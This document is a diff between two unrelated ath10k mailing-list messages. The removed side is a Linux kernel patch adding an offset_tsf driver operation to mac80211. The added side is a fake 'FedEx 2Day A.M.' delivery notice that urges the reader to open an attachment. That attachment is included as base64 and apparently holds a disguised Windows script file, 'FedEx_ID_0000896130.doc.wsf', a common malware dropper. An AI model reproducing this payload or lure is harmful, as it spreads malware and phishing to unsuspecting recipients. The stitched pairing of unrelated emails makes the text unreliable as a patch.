@@ -1,15 +1,20 @@
 Return-path: <ath10k-bounces+kvalo=adurom.com@lists.infradead.org>
-Received: from wolverine02.qualcomm.com ([199.106.114.251])
- by bombadil.infradead.org with esmtps (Exim 4.85_2 #1 (Red Hat Linux))
- id 1bpOko-0006fA-26
- for ath10k@lists.infradead.org; Wed, 28 Sep 2016 23:59:11 +0000
-From: Thomas Pedersen <twp@qca.qualcomm.com>
-Subject: [PATCH 1/4] mac80211: add offset_tsf driver op
-Date: Wed, 28 Sep 2016 16:56:28 -0700
-Message-ID: <20160928235631.9197-2-twp@qca.qualcomm.com>
-In-Reply-To: <20160928235631.9197-1-twp@qca.qualcomm.com>
-References: <20160928235631.9197-1-twp@qca.qualcomm.com>
+Received: from p3nlsmtpcp01-01.prod.phx3.secureserver.net ([184.168.200.138])
+ by bombadil.infradead.org with esmtps (Exim 4.85_2 #1 (Red Hat
+ Linux)) id 1bprDn-0003vN-VE
+ for ath10k@lists.infradead.org; Fri, 30 Sep 2016 06:23:01 +0000
+Received: from i07f3156896401 by p3plcpnl0569.prod.phx3.secureserver.net with
+ local (Exim 4.87)
+ (envelope-from <i07f3156896401@p3plcpnl0569.prod.phx3.secureserver.net>)
+ id 1bprBT-000472-36
+ for ath10k@lists.infradead.org; Thu, 29 Sep 2016 23:20:35 -0700
+Subject: Delivery Notification, ID 0000896130
+Date: Fri, 30 Sep 2016 06:20:35 +0000
+From: "FedEx 2Day A.M." <bobby.andrews@sedp.co>
+Message-ID: <bf492f2df208d07c01db9112e7fced31@sedp.co>
 MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1_7dd0611822564906baec43ce1ccf258a"
+Content-Transfer-Encoding: 8bit
 List-Id: <ath10k.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/ath10k>,
  <mailto:ath10k-request@lists.infradead.org?subject=unsubscribe>
@@ -18,179 +23,138 @@ List-Post: <mailto:ath10k@lists.infradead.org>
 List-Help: <mailto:ath10k-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/ath10k>,
  <mailto:ath10k-request@lists.infradead.org?subject=subscribe>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Reply-To: "FedEx 2Day A.M." <bobby.andrews@sedp.co>
 Sender: "ath10k" <ath10k-bounces@lists.infradead.org>
 Errors-To: ath10k-bounces+kvalo=adurom.com@lists.infradead.org
-To: ath10k <ath10k@lists.infradead.org>
-Cc: Thomas Pedersen <twp@qca.qualcomm.com>, linux-wireless <linux-wireless@vger.kernel.org>
+To: ath10k@lists.infradead.org
 
-Allows ie. mesh sync code to make incremental TSF
-adjustments, avoiding any uncertainty introduced by delay
-in programming absolute TSF.
+--b1_7dd0611822564906baec43ce1ccf258a
+Content-Type: text/plain; charset=us-ascii
 
-Signed-off-by: Thomas Pedersen <twp@qca.qualcomm.com>
----
- include/net/mac80211.h        |  8 ++++++++
- net/mac80211/debugfs_netdev.c | 12 +++++++++---
- net/mac80211/driver-ops.c     | 15 +++++++++++++++
- net/mac80211/driver-ops.h     |  3 +++
- net/mac80211/mesh_sync.c      | 10 +++++++---
- net/mac80211/trace.h          | 26 ++++++++++++++++++++++++++
- 6 files changed, 68 insertions(+), 6 deletions(-)
+Dear Customer,
 
-diff --git a/include/net/mac80211.h b/include/net/mac80211.h
-index 5296100..6312cbda9f 100644
---- a/include/net/mac80211.h
-+++ b/include/net/mac80211.h
-@@ -3166,6 +3166,12 @@ enum ieee80211_reconfig_type {
-  *	required function.
-  *	The callback can sleep.
-  *
-+ * @offset_tsf: Offset the TSF timer by the specified value in the
-+ *	firmware/hardware.  Preferred to set_tsf as it avoids delay between
-+ *	calling set_tsf() and hardware getting programmed, which will show up
-+ *	as TSF delay. Is not a required function.
-+ *	The callback can sleep.
-+ *
-  * @reset_tsf: Reset the TSF timer and allow firmware/hardware to synchronize
-  *	with other STAs in the IBSS. This is only used in IBSS mode. This
-  *	function is optional if the firmware/hardware takes full care of
-@@ -3531,6 +3537,8 @@ struct ieee80211_ops {
- 	u64 (*get_tsf)(struct ieee80211_hw *hw, struct ieee80211_vif *vif);
- 	void (*set_tsf)(struct ieee80211_hw *hw, struct ieee80211_vif *vif,
- 			u64 tsf);
-+	void (*offset_tsf)(struct ieee80211_hw *hw, struct ieee80211_vif *vif,
-+			   s64 offset);
- 	void (*reset_tsf)(struct ieee80211_hw *hw, struct ieee80211_vif *vif);
- 	int (*tx_last_beacon)(struct ieee80211_hw *hw);
- 	int (*ampdu_action)(struct ieee80211_hw *hw,
-diff --git a/net/mac80211/debugfs_netdev.c b/net/mac80211/debugfs_netdev.c
-index 5d35c0f..bcec124 100644
---- a/net/mac80211/debugfs_netdev.c
-+++ b/net/mac80211/debugfs_netdev.c
-@@ -556,9 +556,15 @@ static ssize_t ieee80211_if_parse_tsf(
- 		ret = kstrtoull(buf, 10, &tsf);
- 		if (ret < 0)
- 			return ret;
--		if (tsf_is_delta)
--			tsf = drv_get_tsf(local, sdata) + tsf_is_delta * tsf;
--		if (local->ops->set_tsf) {
-+		if (tsf_is_delta && local->ops->offset_tsf) {
-+			drv_offset_tsf(local, sdata, tsf_is_delta * tsf);
-+			wiphy_info(local->hw.wiphy,
-+				   "debugfs offset TSF by %018lld\n",
-+				   tsf_is_delta * tsf);
-+		} else if (local->ops->set_tsf) {
-+			if (tsf_is_delta)
-+				tsf = drv_get_tsf(local, sdata) +
-+				      tsf_is_delta * tsf;
- 			drv_set_tsf(local, sdata, tsf);
- 			wiphy_info(local->hw.wiphy,
- 				   "debugfs set TSF to %#018llx\n", tsf);
-diff --git a/net/mac80211/driver-ops.c b/net/mac80211/driver-ops.c
-index c701b64..bb886e7 100644
---- a/net/mac80211/driver-ops.c
-+++ b/net/mac80211/driver-ops.c
-@@ -215,6 +215,21 @@ void drv_set_tsf(struct ieee80211_local *local,
- 	trace_drv_return_void(local);
- }
- 
-+void drv_offset_tsf(struct ieee80211_local *local,
-+		    struct ieee80211_sub_if_data *sdata,
-+		    s64 offset)
-+{
-+	might_sleep();
-+
-+	if (!check_sdata_in_driver(sdata))
-+		return;
-+
-+	trace_drv_offset_tsf(local, sdata, offset);
-+	if (local->ops->offset_tsf)
-+		local->ops->offset_tsf(&local->hw, &sdata->vif, offset);
-+	trace_drv_return_void(local);
-+}
-+
- void drv_reset_tsf(struct ieee80211_local *local,
- 		   struct ieee80211_sub_if_data *sdata)
- {
-diff --git a/net/mac80211/driver-ops.h b/net/mac80211/driver-ops.h
-index fe35a1c..f47781ab1 100644
---- a/net/mac80211/driver-ops.h
-+++ b/net/mac80211/driver-ops.h
-@@ -568,6 +568,9 @@ u64 drv_get_tsf(struct ieee80211_local *local,
- void drv_set_tsf(struct ieee80211_local *local,
- 		 struct ieee80211_sub_if_data *sdata,
- 		 u64 tsf);
-+void drv_offset_tsf(struct ieee80211_local *local,
-+		    struct ieee80211_sub_if_data *sdata,
-+		    s64 offset);
- void drv_reset_tsf(struct ieee80211_local *local,
- 		   struct ieee80211_sub_if_data *sdata);
- 
-diff --git a/net/mac80211/mesh_sync.c b/net/mac80211/mesh_sync.c
-index 64bc22a..22ca43c 100644
---- a/net/mac80211/mesh_sync.c
-+++ b/net/mac80211/mesh_sync.c
-@@ -70,9 +70,13 @@ void mesh_sync_adjust_tbtt(struct ieee80211_sub_if_data *sdata)
- 	}
- 	spin_unlock_bh(&ifmsh->sync_offset_lock);
- 
--	tsf = drv_get_tsf(local, sdata);
--	if (tsf != -1ULL)
--		drv_set_tsf(local, sdata, tsf + tsfdelta);
-+	if (local->ops->offset_tsf) {
-+		drv_offset_tsf(local, sdata, tsfdelta);
-+	} else {
-+		tsf = drv_get_tsf(local, sdata);
-+		if (tsf != -1ULL)
-+			drv_set_tsf(local, sdata, tsf + tsfdelta);
-+	}
- }
- 
- static void mesh_sync_offset_rx_bcn_presp(struct ieee80211_sub_if_data *sdata,
-diff --git a/net/mac80211/trace.h b/net/mac80211/trace.h
-index 77e4c53..10e9d4b 100644
---- a/net/mac80211/trace.h
-+++ b/net/mac80211/trace.h
-@@ -984,6 +984,32 @@ TRACE_EVENT(drv_set_tsf,
- 	)
- );
- 
-+TRACE_EVENT(drv_offset_tsf,
-+	TP_PROTO(struct ieee80211_local *local,
-+		 struct ieee80211_sub_if_data *sdata,
-+		 s64 offset),
-+
-+	TP_ARGS(local, sdata, offset),
-+
-+	TP_STRUCT__entry(
-+		LOCAL_ENTRY
-+		VIF_ENTRY
-+		__field(s64, tsf_offset)
-+	),
-+
-+	TP_fast_assign(
-+		LOCAL_ASSIGN;
-+		VIF_ASSIGN;
-+		__entry->tsf_offset = offset;
-+	),
-+
-+	TP_printk(
-+		LOCAL_PR_FMT  VIF_PR_FMT  " tsf offset:%lld",
-+		LOCAL_PR_ARG, VIF_PR_ARG,
-+		(unsigned long long)__entry->tsf_offset
-+	)
-+);
-+
- DEFINE_EVENT(local_sdata_evt, drv_reset_tsf,
- 	TP_PROTO(struct ieee80211_local *local,
- 		 struct ieee80211_sub_if_data *sdata),
--- 
-2.10.0.297.gf6727b0
+Courier was unable to deliver the parcel to you.
+Please, open email attachment to print shipment label.
 
+Yours faithfully,
+Bobby Andrews,
+Sr. Delivery Manager.
+
+
+--b1_7dd0611822564906baec43ce1ccf258a
+Content-Type: application/zip; name="FedEx_ID_0000896130.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=FedEx_ID_0000896130.zip
+
+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
+
+
+--b1_7dd0611822564906baec43ce1ccf258a
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 ath10k mailing list
 ath10k@lists.infradead.org
 http://lists.infradead.org/mailman/listinfo/ath10k
+
+--b1_7dd0611822564906baec43ce1ccf258a--
